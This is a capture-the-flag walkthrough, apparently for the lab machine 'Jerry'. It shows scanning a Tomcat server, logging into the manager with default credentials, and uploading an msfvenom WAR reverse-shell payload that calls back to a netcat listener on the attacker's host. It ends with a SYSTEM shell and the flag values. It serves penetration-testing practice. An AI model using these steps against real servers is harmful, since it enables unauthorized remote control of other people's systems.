Run an `nmap` scan of target

```php
nmap -A -sV -Pn 10.129.136.9

8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
```

Were interested in this Apache server that could be hosting some kind of app
Run a `gobuster` and `ffuf` scan on the target

```php
ffuf -u http://10.129.136.9:8080/FUZZ -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404

gobuster dir -u http://10.129.136.9:8080 -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --no-error
```

Our points of interest
`http://10.129.136.9:8080/` - default web page for `Apache Tomcat/7.0.88`
`http://10.129.136.9:8080/docs/` - documentation page for `Apache Tomcat`
`http://10.129.136.9:8080/manager` - this is what we want

We find a login prompt to authenticate, we have no credentials so lets first try some default ones and see what hits.

```php
conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.
```

```php
https://gist.github.com/0xRar/70aae102af56495b7be51486d363c4bd
tomcat : s3cret
```

Upon logging in we see an admin panel that lists applications running, we have the ability to upload `WAR` files 
Lets use `msfvenom` to create a `WAR` file payload to upload, when triggered it we will set up a `netcat` listener for this reverse shell. The goal is to gain remote command execution. 

```php
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.209 LPORT=443 -f war > revshell.war
```

Uploading it creates a path called `/revshell`

An a separate terminal we setup a listener

```php
sudo nc -nvlp 443
[sudo] password for drew: 
Listening on 0.0.0.0 443
```

We unzip our war file to find a `ddpcwbqmrwlg.jsp`, this is were our payload is located, when we navigate to this web path we trigger the payload

```php
http://10.129.39.5:8080/revshell/ddpcwbqmrwlg.jsp
```

We have gained a reverse shell on the Jerry machine 

```php
Connection received on 10.129.39.5 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

We navigate to the Desktop directory through the Administrator user to find the User and Root flags in a file called `2 for the price of 1.txt`

User Flag: `7004dbcef0f854e0fb401875f26ebd00`
Root Flag: `04a8b36e1545a455393d067e772fe90e`

We have rooted this machine.
